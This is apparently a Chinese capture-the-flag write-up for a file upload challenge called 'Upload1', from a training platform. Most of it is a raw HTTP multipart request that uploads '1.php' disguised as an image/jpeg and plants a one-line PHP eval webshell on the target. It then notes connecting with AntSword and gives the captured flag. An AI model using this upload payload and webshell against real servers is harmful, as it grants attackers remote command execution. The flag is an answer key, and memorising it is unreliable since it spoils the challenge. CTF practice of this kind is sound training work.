# Upload1

> 文件上传,直接修改文件后缀,上传一句话木马

## 思路分析

> 文件上传,直接修改文件后缀,上传一句话木马,蚁剑连接翻找flag文件

## payload

```
POST /index.php HTTP/1.1
Host: 61.147.171.105:61886
Content-Length: 207
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:61886
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary67OQEMWOgNmWGDxW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:61886/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary67OQEMWOgNmWGDxW
Content-Disposition: form-data; name="upfile"; filename="1.php"
Content-Type: image/jpeg

<?php @eval($_POST[a]); ?>
------WebKitFormBoundary67OQEMWOgNmWGDxW--
```

## flag

> cyberpeace{daf60bdf62b41b5a67e338d627e12624}